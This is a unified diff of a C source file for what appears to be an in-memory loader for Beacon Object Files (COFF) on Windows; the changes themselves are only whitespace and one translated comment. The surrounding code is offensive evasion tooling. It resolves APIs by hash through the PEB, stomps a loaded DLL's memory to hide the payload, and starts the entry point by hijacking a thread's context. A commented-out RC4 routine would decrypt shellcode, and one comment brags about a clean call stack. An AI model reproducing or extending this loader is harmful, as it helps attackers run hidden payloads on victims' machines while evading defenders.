@@ -2,17 +2,17 @@
 
 int main(INT argc ,CHAR **argv)
 {
-	CHAR*	szBofEntryPoint = NULL;
+	CHAR*	szBofEntryPoint 	= NULL;
 	PBYTE	pbBofBuffer		= NULL;
 	PVOID   pvNextBase		= NULL;
 	PVOID	pvBofArgBuf		= NULL;
-	DWORD	dwBofArgSize	= 0;
+	DWORD	dwBofArgSize		= 0;
 	DWORD   dwBofSize		= 0;
 	PCOFFEE pCoffee			= NULL;
 	hProcessHeap			= GetProcessHeap();
 
 	if (!LdrResolveFunction()) goto _CleanUp;
-	else					   printf("[+] Ldr Resolve Function Successfully \n");
+	else			   printf("[+] Ldr Resolve Function Successfully \n");
 
 #ifdef _DEBUG
 	szBofEntryPoint = "go";
@@ -30,7 +30,7 @@ int main(INT argc ,CHAR **argv)
 	if(argv[3] != NULL && atoi(argv[3]) > 0) BofPack(&pvBofArgBuf, &dwBofArgSize, argv);
 #endif
 	
-	pCoffee					= HeapAlloc(hProcessHeap, HEAP_ZERO_MEMORY, sizeof(COFFEE));
+	pCoffee				= HeapAlloc(hProcessHeap, HEAP_ZERO_MEMORY, sizeof(COFFEE));
 	pCoffee->Data			= pbBofBuffer;
 	pCoffee->Header			= pCoffee->Data;
 	pCoffee->Symbol			= (LPVOID)((ULONG_PTR)(pCoffee->Data) + pCoffee->Header->PointerToSymbolTable);
@@ -61,7 +61,7 @@ int main(INT argc ,CHAR **argv)
 
 	for (DWORD dwSecCnt = 0; dwSecCnt < pCoffee->Header->NumberOfSections; dwSecCnt++)
 	{
-		pCoffee->Section				= (PVOID)(((ULONG_PTR)pCoffee->Data) + sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * dwSecCnt));
+		pCoffee->Section		= (PVOID)(((ULONG_PTR)pCoffee->Data) + sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * dwSecCnt));
 		pCoffee->SecMap[dwSecCnt].Size	= pCoffee->Section->SizeOfRawData;
 		pCoffee->SecMap[dwSecCnt].Ptr	= pvNextBase;
 
@@ -79,7 +79,7 @@ int main(INT argc ,CHAR **argv)
 		for (DWORD dwCnt = 0; dwCnt < dwBssEntryNum; dwCnt++)
 		{
 			BssEntry[dwCnt].pvSysmbolAddr	= NULL;
-			BssEntry[dwCnt].stOffset		= 0;
+			BssEntry[dwCnt].stOffset	= 0;
 		}
 	}
 
@@ -99,8 +99,8 @@ _CleanUp:
 	printf("END : \\O/ ");
 	if (pCoffee->ImageBase) VirtualFree(pCoffee->ImageBase, 0, MEM_RELEASE);
 	if (pCoffee->SecMap)	HEAPSECUREFREE(pCoffee->SecMap, pCoffee->Header->NumberOfSections * sizeof(SECTION_MAP));
-	if (pCoffee)			HEAPSECUREFREE(pCoffee, sizeof(COFFEE));
-	if (pbBofBuffer)		HEAPSECUREFREE(pbBofBuffer, dwBofSize);
+	if (pCoffee)		HEAPSECUREFREE(pCoffee, sizeof(COFFEE));
+	if (pbBofBuffer)	HEAPSECUREFREE(pbBofBuffer, dwBofSize);
 	return 0;
 }
 
@@ -109,15 +109,15 @@ _CleanUp:
 // totalsize arg1size arg1 arg2size arg2 ... 
 VOID BofPack(PVOID* pvBofArgBuf, DWORD* pdwBofArgSize, CHAR** argv)
 {
-	Arg	  arg[MAXARGNUM] = { 0 };
-	DWORD dwTotalSizeOffset = 4;
+	Arg	  arg[MAXARGNUM] 	= { 0 };
+	DWORD dwTotalSizeOffset 	= 4;
 	for (DWORD dwCnt = 0; dwCnt < atoi(argv[3]); dwCnt++)
 	{
 		if (!argv[4 + dwCnt]) { printf("Failed To Get Param %d,exit ...", dwCnt + 1); exit(0); }
 		if (IsDigit(argv[4 + dwCnt]) == TRUE)
 		{
-			arg[dwCnt].length = sizeof(UINT32);
-			arg[dwCnt].num = atoi(argv[4 + dwCnt]);
+			arg[dwCnt].length 	= sizeof(UINT32);
+			arg[dwCnt].num 		= atoi(argv[4 + dwCnt]);
 			_Memcpy(arg[dwCnt].buffer, &arg[dwCnt].num, 4);
 		}
 		else
@@ -145,14 +145,14 @@ VOID BofPack(PVOID* pvBofArgBuf, DWORD* pdwBofArgSize, CHAR** argv)
 
 PVOID CoffeeModuleStomping(DWORD dwSize)
 {
-	HANDLE				hStompModule	= INVALID_HANDLE_VALUE;
+	HANDLE				hStompModule		= INVALID_HANDLE_VALUE;
 	PVOID				pvBofBuffer		= NULL;
 	SIZE_T				stBofSize		= dwSize;
 	ULONG				uNewProtect		= PAGE_READWRITE;
 	ULONG				uOldProtect		= 0;
 	ULONG				uFlags			= 0x2;
-	DWORD				dwModuleHash	= HashEx(TARGETMODULE, StringLengthA(TARGETMODULE), TRUE);
-	UNICODE_STRING		usDllPath		= { 0 };
+	DWORD				dwModuleHash		= HashEx(TARGETMODULE, StringLengthA(TARGETMODULE), TRUE);
+	UNICODE_STRING			usDllPath		= { 0 };
 
 	if (!GetModuleByPeb(dwModuleHash))
 	{
@@ -185,9 +185,9 @@ PVOID CoffeeModuleStomping(DWORD dwSize)
 VOID HitCoffeeEntryPoint(PVOID pvCoffeeEntryPoint,PVOID pvArgument,DWORD dwArgSize)
 {
 	HANDLE		hThread			= INVALID_HANDLE_VALUE; 
-	HANDLE		hThreadToken	= INVALID_HANDLE_VALUE;
-	CONTEXT		ctx				= {0};
-	OBJECT_ATTRIBUTES objAttr	= {0};
+	HANDLE		hThreadToken		= INVALID_HANDLE_VALUE;
+	CONTEXT		ctx			= {0};
+	OBJECT_ATTRIBUTES objAttr		= {0};
 	ctx.ContextFlags			= CONTEXT_ALL;
 
 	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
@@ -203,7 +203,7 @@ VOID HitCoffeeEntryPoint(PVOID pvCoffeeEntryPoint,PVOID pvArgument,DWORD dwArgSi
 		*(ULONG_PTR*)(ctx.Rsp) = (ULONG_PTR)win32Api.pfnRtlExitUserThread;
 	
 		if (win32Api.pfnNtSetContextThread(hThread, &ctx))	__fastfail(0xc00000022);
-		if (win32Api.pfnNtResumeThread(hThread, 0))			__fastfail(0xc00000022);
+		if (win32Api.pfnNtResumeThread(hThread, 0))		__fastfail(0xc00000022);
 		printf("[+] Hit Bof Entry %p \n", pvCoffeeEntryPoint);
 	}
 
@@ -215,7 +215,7 @@ VOID RunCoff(PCOFFEE pCoffee,CHAR* szBofEntryPoint, PVOID pvArgument,DWORD dwArg
 {
 	
 	DWORD	dwCnt					= 0;
-	PVOID	pvCoffeeEntryPoint		= NULL;
+	PVOID	pvCoffeeEntryPoint			= NULL;
 	HANDLE	hVeh					= INVALID_HANDLE_VALUE;
 
 	for (;dwCnt < pCoffee->Header->NumberOfSymbols; dwCnt++)
@@ -267,7 +267,7 @@ BOOL CoffeeProcessSection(PCOFFEE pCoffee)
 	PCHAR        pSymbolName		= NULL;
 	DWORD        dwNumberOfFunc		= 0;
 	PVOID		 pvRelocAddr		= NULL;
-	PVOID	     pvSymbolSecAddr	= NULL;
+	PVOID	     pvSymbolSecAddr		= NULL;
 	PCOFF_SYMBOL pCoffSymbol		= NULL;
 	PVOID		 pvBssTableAddr		= pCoffee->BSS;
 	
@@ -392,13 +392,13 @@ BOOL CoffeeProcessSection(PCOFFEE pCoffee)
 }
 
 
-// 1.解析内部Beacon Api 2.解析library$api // 3.处理 .bss 
+// 1.parseBeacon Api 2.parselibrary$api // 3.parse .bss 
 BOOL CoffeeProcessSymbol(PCHAR pSymbolName, PCOFF_SYMBOL pCoffSymbol,PVOID *pvFunctionAddr,PDWORD pdwBssAddr)
 {
 	CHAR		szSymbolName[1024]	= { 0 };
-	CHAR*		libraryName			= NULL;
+	CHAR*		libraryName		= NULL;
 	CHAR*		functionName		= NULL;
-	CHAR*		symbolName			= NULL;
+	CHAR*		symbolName		= NULL;
 	DWORD		dwBeaconNameHash	= 0;
 
 	_Memset(szSymbolName, 0, 1024);
@@ -427,9 +427,9 @@ BOOL CoffeeProcessSymbol(PCHAR pSymbolName, PCOFF_SYMBOL pCoffSymbol,PVOID *pvFu
 	{
 		BOOL				bIsStandardFormat	= FALSE;
 		DWORD				dwLibraryNameHash	= 0;
-		ULONG				uFlags				= 0x2;
-		HMODULE				hModule				= INVALID_HANDLE_VALUE;
-		ANSI_STRING			AnsiString			= { 0 };
+		ULONG				uFlags			= 0x2;
+		HMODULE				hModule			= INVALID_HANDLE_VALUE;
+		ANSI_STRING			AnsiString		= { 0 };
 		UNICODE_STRING		usDllPath			= { 0 };
 
 		for (DWORD dwCnt = 0;dwCnt < StringLengthA(pSymbolName); dwCnt++)
@@ -441,20 +441,20 @@ BOOL CoffeeProcessSymbol(PCHAR pSymbolName, PCOFF_SYMBOL pCoffSymbol,PVOID *pvFu
 			}
 		}
 
-		libraryName						= pSymbolName + COFF_PREP_SYMBOL_SIZE;
-		libraryName						= StringTokenA(libraryName, "$");
+		libraryName					= pSymbolName + COFF_PREP_SYMBOL_SIZE;
+		libraryName					= StringTokenA(libraryName, "$");
 		functionName					= libraryName + StringLengthA(libraryName) + 1;
 		dwLibraryNameHash				= HashEx(libraryName, StringLengthA(libraryName), TRUE);
 
 		if (bIsStandardFormat)
 		{
-			hModule						= GetModuleByPeb(dwLibraryNameHash);
-			if (!hModule)hModule		= LoadLibraryA(libraryName);  // But I Have A Valid CallStack :P
+			hModule					= GetModuleByPeb(dwLibraryNameHash);
+			if (!hModule)hModule			= LoadLibraryA(libraryName);  // But I Have A Valid CallStack :P
 
 			_Memcpy(szSymbolName, functionName, StringLengthA(functionName));
 			
 			AnsiString.Length			= StringLengthA(functionName);
-			AnsiString.MaximumLength	= AnsiString.Length + sizeof(CHAR);
+			AnsiString.MaximumLength		= AnsiString.Length + sizeof(CHAR);
 			AnsiString.Buffer			= szSymbolName;
 			
 			win32Api.pfnLdrGetProcedureAddress(hModule, &AnsiString, 0, pvFunctionAddr);
@@ -510,8 +510,8 @@ SIZE_T ParseTotalSize(PCOFFEE pCoffee,SIZE_T* stTotalSize,PSIZE_T pstBSSSize)
 	PCHAR        pSymbolName		= NULL;
 	DWORD        dwNumberOfFunc		= 0;
 	PCOFF_SYMBOL pCoffSymbol		= NULL;
-	*stTotalSize					= 0;
-	*pstBSSSize						= 0;
+	*stTotalSize				= 0;
+	*pstBSSSize				= 0;
 
 	for (DWORD dwSectionCnt = 0; dwSectionCnt < pCoffee->Header->NumberOfSections; dwSectionCnt++)
 	{
@@ -605,7 +605,7 @@ BOOL ReadPayLoad(PBYTE* pbBofBuffer, PDWORD pdwBofSize, CHAR* szBofPath)
 
 	// Decrypt? ReplaceMe :)
 	//unsigned char	s[256]		= { 0x29 ,0x23 ,0xBE ,0x84 ,0xE1 ,0x6C ,0xD6 ,0xAE ,0x00 };
-	//char			key[256]	= { 0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 };
+	//char		key[256]	= { 0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 };
 
 	//RC4Init(s, key, (unsigned long)strlen(key));
 	//RC4Crypt(s, pvShellcodeBuffer, dwFileSize);
